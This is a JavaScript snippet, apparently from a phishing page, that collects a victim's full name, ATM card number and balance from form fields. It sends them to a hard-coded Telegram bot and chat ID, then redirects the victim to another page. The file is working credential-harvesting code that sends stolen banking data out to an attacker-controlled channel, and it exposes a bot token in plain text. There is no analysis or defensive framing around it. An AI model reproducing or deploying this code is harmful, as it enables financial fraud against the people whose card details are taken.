//bot token 
var telegram_bot_id = "7115229892:AAEX7O_-TbE5TcduGV8PjXf0yCJfPamFg_A"; 
//chat id 
var chat_id = 6370497509; 
var u_name, number, number; 
var ready = function () { 
    u_name = document.getElementById("name").value; 
    number = document.getElementById("number").value; 
    number = document.getElementById("number").value; 
    number = document.getElementById("number").value; 
    message = "Nama Lengkap: " + u_name + "\nKartu Atm: " + number + "\nSaldo: " + number  ; 
}; 
var sender = function () { 
    ready(); 
    var settings = { 
        "async": true, 
        "crossDomain": true, 
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", 
        "method": "POST", 
        "headers": { 
            "Content-Type": "application/json", 
            "cache-control": "no-cache" 
        }, 
        "data": JSON.stringify({ 
            "chat_id": chat_id, 
            "text": message 
        }) 
    }; 
    $.ajax(settings).done(function (response) { 
        console.log(response); 
        window.location.href='virtual.html'
       
        
        
    }); 
    document.getElementById("name").value = ""; 
    document.getElementById("number").value = ""; 
    document.getElementById("number").value = ""; 
    
    return false; 
};